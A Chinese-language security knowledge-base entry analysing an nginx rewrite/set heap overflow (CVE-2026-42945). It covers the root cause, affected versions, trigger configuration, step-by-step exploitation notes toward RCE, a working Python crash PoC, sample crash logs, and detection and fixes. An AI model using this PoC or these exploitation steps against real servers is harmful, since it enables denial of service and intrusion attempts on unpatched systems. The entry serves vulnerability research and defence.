---
id: binary-pwn-heap-nginx-rewrite-isargs-dual-engine-overflow
title: nginx rewrite+set 双引擎 is_args 不一致堆溢出（CVE-2026-42945）：+ 号 1→3 展开冲爆 buffer
type: scenario
domain: binary
path: binary/pwn/heap
technique: nginx-rewrite-isargs-dual-engine-heap-overflow
tags:
- nginx
- heap-overflow
- cve
- rewrite
- is-args
- dual-engine
- uri-escape
- rce-constraints
- gdb
cve:
- CVE-2026-42945
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: nginx 0.6.27–1.30.0（1.31.0 / 1.30.1 修复）；OpenResty 1.21.4、Tengine 2.4.0 受影响
verification:
  verified_by: verifier-V102
  verified_at: '2026-11-05T22:37:28+08:00'
  notes: 已对照原文与14张内嵌图核对（源码、GDB堆布局、crash形态、版本区间）；RCE未在本机复现，原文明确仅验证crash与堆布局。
url: /docs/binary/pwn/heap/binary-pwn-heap-nginx-rewrite-isargs-dual-engine-overflow/
draft: false
kb_aliases:
- CVE-2026-42945
- nginx Rift
- nginx rewrite 堆溢出
- is_args 双引擎
- e/le 状态不一致
- NGX_ESCAPE_ARGS
- rewrite? + set $1
---

## 一句话结论

nginx 配置同时使用 `rewrite`（替换串含 `?`）和 `set $var $1` 时，rewrite 把主引擎 `e->is_args` 设为 1，而 `set` 的长度计算使用被 `ngx_memzero` 清零的子引擎 `le`（`le.is_args=0`），按原始捕获长度分配 buffer；执行拷贝却用主引擎 `e`（`is_args=1`）调用 `ngx_escape_uri`，把 URI 中的 `+` 等字符 1→3 展开（`+`→`%2B`），写入长度最多超出 2N 字节，造成 nginx worker 堆溢出并在 pool 清理阶段 SIGABRT。

## 原理

- **触发配置**：
  ```nginx
  location ~ ^/api/(.*)$ {
      rewrite ^/api/(.*)$ /internal?migrated=true;
      set $original_endpoint $1;
  }
  ```
  `rewrite` 替换串含 `?` → `ngx_http_script_start_args_code` 把主引擎 `e->is_args = 1`。
- **两遍扫描、两个引擎**：`set $var $1` 触发 `ngx_http_script_complex_value_code`，它声明 `ngx_http_script_engine_t e, le`，对 `le` 做 `ngx_memzero(&le)`（`le.is_args=0`），用 `le` 遍历 `lcode(&le)` 算长度；再用主引擎 `e` 遍历 `code(&e)` 执行拷贝。
- **跨引擎状态读取**：`ngx_http_script_copy_capture_len_code(ngx_http_script_engine_t *e)` 与 `ngx_http_script_copy_capture_code(...)` 都有同一条件：
  `if ((e->is_args || e->quote) && (e->request->quoted_uri || e->request->plus_in_uri))`
  长度阶段函数形参名虽为 `e`，实际传入 `le`，读到 `le.is_args=0`，走 else 返回原始 `cap[n+1]-cap[n]`；执行阶段传入主引擎 `e`，读到 `e.is_args=1`，走 if 调用 `ngx_escape_uri(..., NGX_ESCAPE_ARGS)`。
- **NGX_ESCAPE_ARGS 的 1→3 展开**：`\0-\x1f`、`\x7f-\xff`、`"`、`#`、`%`、`&`、`+`、`;`、`<`、`>`、`?`、`[`、`\`、`]`、`^`、`` ` ``、`{`、`|`、`}`、`~` 会被转义为 `%XX`。其中 `+` 是特例：它在 URI 中可安全传输，进入 nginx 后由 `NGX_ESCAPE_ARGS` 展开为 `%2B`，是理想的填充字符；`%20`（空格）在 URI 中也会变成 `+`。
- **溢出量**：payload `A*349 + '+'*N + X*6`，原始捕获长度 `355+N`，分配 `355+N` 字节；执行时 `A/X` 不转义，N 个 `+` 各占 3 字节，实际写入 `355+3N`，溢出 `2N` 字节。
- **crash 形态**：N≈380 时溢出约 760 字节，`free(): corrupted unsorted chunks`；N≈969 时 `double free or corruption (!prev)`；worker 收到 signal 6（SIGABRT）或 signal 11，master 自动拉起新 worker。请求本身可能仍返回 200/153 字节，因为 `return 200` 在 `set` 之后执行，不依赖被破坏的 pool；crash 发生在请求完成后的 `ngx_destroy_pool` 阶段。
- **为什么潜伏 18 年**：rewrite 带 `?` 与 set 捕获组同时使用不常见；`+` 不是唯一触发字符但最易在 URI 中批量传输；crash 发生在响应之后且 master 自动恢复，业务几乎无感；随机 fuzz 命中 `rewrite+set+?` 组合概率极低；精确利用还需要堆布局控制。
- **GDB 修正的 RCE 路径**：实测 `buf.data` 不在当前 pool 的 `d.last-d.end` 范围内，而是从 pool chain 的旧 block 分配；`buf.data` 地址高于 `pool`，溢出向高地址，`pool->cleanup` 在低地址，`dist_to_cleanup=-4672`，无法直接覆盖 cleanup 指针。溢出覆盖的是后续分配的 cleanup 节点（handler 被写成 NULL，`ngx_destroy_pool` 跳过）以及 glibc chunk 元数据，`free()` 检测到破坏后 SIGABRT。所以“溢出成功”不等于“RCE 成功”。

## 触发条件

- nginx 0.6.27–1.30.0（1.31.0/1.30.1 修复）；OpenResty 1.21.4、Tengine 2.4.0 等基于受影响核心的发行版同样受影响。
- 同一 location 中同时存在：`rewrite` 替换串含 `?`，以及 `set $var $1`（或其他捕获组）引用。
- 请求 URI 中包含大量可被 `NGX_ESCAPE_ARGS` 展开的字符（首选 `+` 或 `%20`），触发 `quoted_uri`/`plus_in_uri` 条件。
- 攻击者可发送任意 URI 到该 location；无需认证（取决于业务配置）。
- 若要进一步 RCE，还需要 ASLR 绕过/信息泄露、目标版本精确堆布局控制，且 glibc ≥2.34 已移除 `__free_hook`。

## 利用步骤

1. 确认 nginx 版本与配置：`nginx -v`，检查 `rewrite` 替换串带 `?` 且同一 location 使用 `set $var $1`。
2. 构造 payload：`A*349 + '+'*N + X*6`；N 从 380 起测，观察 worker crash；N=969 可触发更明显的 double-free 检测。
3. 发送 `GET /api/<payload> HTTP/1.1`，保持连接读取响应；同时 `tail -f logs/error.log` 观察 `worker process exited on signal 6/11`。
4. 用 GDB attach worker，在 `copy_capture_len_code`/`copy_capture_code`/`ngx_palloc`/`ngx_destroy_pool` 下断点，检查 `buf.data`、`buf.len`、`pool->cleanup`、`dist_to_cleanup` 与 cleanup 节点内容。
5. 若目标是 RCE：先寻找信息泄露获取堆/libc 地址，再通过请求序列（spray 数量、body 大小、时序）重排堆布局，尝试让 `buf.data` 落在 pool 结构体之前并覆盖 cleanup/large 链；注意 glibc 2.35+ 的 chunk 校验会先于 cleanup 遍历触发 abort。
6. 若只需拒绝服务/验证，记录 crash 形态与 worker 重启即可。

## PoC

```python
import socket, time

s = socket.create_connection(("127.0.0.1", 19321))
payload = "A" * 349 + "+" * 969 + "X" * 6   # N=380 可先触发 corrupted unsorted chunks
req = (
    "GET /api/" + payload + " HTTP/1.1\r\n"
    "Host: localhost\r\nConnection: close\r\n\r\n"
).encode("latin-1")
s.sendall(req)
time.sleep(1)
try:
    s.settimeout(2)
    data = s.recv(1024)
    print("Response:", len(data), "bytes")
except Exception as e:
    print("Error:", str(e)[:60])
s.close()
```

```nginx
# 危险配置（同时 rewrite? 与 set $1）
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /internal?migrated=true;
    set $original_endpoint $1;
}
```

```text
# 典型 error.log
free(): corrupted unsorted chunks
[alert] worker process 3507172 exited on signal 6 (core dumped)
# 或 N=969
double free or corruption (!prev)
[alert] worker process exited on signal 6 (core dumped)
```

## 变体与关联

- 变体：`$2` 等捕获组位置不同，溢出计算受影响；`%20` 进入 URI 后变成 `+` 同样触发；其他可被 `NGX_ESCAPE_ARGS` 展开的字符也可用，但 URI 语法/代理预处理会限制可用性。
- 变体：proxy/grpc/fastcgi/uwsgi/scgi/proxy_v2 也有 `e, le` 双引擎，但各自独立初始化 `le`，不参与 rewrite 的 `is_args` 跨阶段传递，当前未触发同洞；stream 模块无双引擎，不受影响。架构层面的同 bug class 可能出现在 `quote`、`flushed` 等其他被 `ngx_memzero` 清零的字段。
- 关联：[[code-analysis-source-audit-double-path-state-divergence]]（双路径分歧审计模式）、[[code-analysis-source-audit-nginx-dual-engine-scanner]]（自动化检测框架）、[[cloud-k8s-ingress-nginx-spec-path-quote-config-injection]]（同一年 rewrite 模块的另一个攻击面 CVE-2026-3288）。
- 边界：本文环境（Ubuntu 22.04/glibc 2.35/nginx 1.30.0/-O2）下未打通 RCE，只验证了 crash 与堆布局；不同编译选项、proxy_pass 配置、请求序列会改变堆布局。RCE 需要信息泄露与精确堆布局，不是蠕虫式利用。

## 检测与防御

- 检测：扫描配置中同一 location 的 `rewrite ...?` + `set $var $1` 组合；监控 error.log 的 `signal 6/11`、`corrupted unsorted chunks`、`double free`；WAF 拦截 URI 中连续大量 `+`（如 `\+{100,}`）；对 nginx 版本做资产盘点。
- 修复：升级 nginx 1.31.0/1.30.1；NGINX Plus R36 P4/R35 P2/R32 P6；OpenResty/Tengine 同步上游修复。
- 缓解：避免 rewrite 替换串带 `?` 与 set 捕获组同时使用；rewrite 后加 `break` 或改用命名捕获/其他变量；set 后立即重置变量（仅绕过触发条件，底层 bug 仍在）；最小权限运行 worker，配合 ASLR/沙箱/崩溃监控。
